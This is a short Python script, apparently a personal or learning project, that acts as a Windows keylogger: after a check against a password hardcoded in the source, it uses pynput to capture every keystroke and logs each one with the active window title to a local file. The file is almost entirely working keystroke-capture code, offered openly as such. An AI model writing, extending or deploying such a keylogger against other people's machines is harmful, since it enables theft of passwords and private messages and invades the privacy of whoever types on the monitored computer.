import getpass
import psutil
import logging

from pynput.keyboard import Listener

import win32gui  

PASSWORD = "ritam@2005"

def authenticate():
    
    attempts = 5
    for i in range(attempts):
        entered_password = getpass.getpass("Enter Password: ")
        if entered_password == PASSWORD:
            print("Authentication Successful...\n")
            return True
        else:
            print("Incorrect Password.")
        i+=1
    print("Exiting...")
    return False

LOG_FILE = "logger.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(message)s")

def active_window():
    
    try:
        hwnd = win32gui.GetForegroundWindow()  
        window_title = win32gui.GetWindowText(hwnd)  
        if window_title:
            return window_title
    except:
        return "Unknown Window"
    return "Unknown Window"

# def active_process():
    
#     try:
#         hwnd = win32gui.GetForegroundWindow()
#         pid = win32gui.GetWindowThreadProcessId(hwnd)[1] 
#         process_name = psutil.Process(pid).name()
#         return process_name
#     except:
#         return "Unknown Process"

def logger(key):
    
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = ""  
    elif key.endswith("\x16") or key.endswith("\x03"):
        key = ""  

    window = active_window()
    

    log_entry = f"Working on - {window} | {key}"
    print("Listening....") 
    logging.info(log_entry)

if authenticate():
    
    with Listener(on_press=logger) as listener:
        listener.join()
else:
    exit(1)
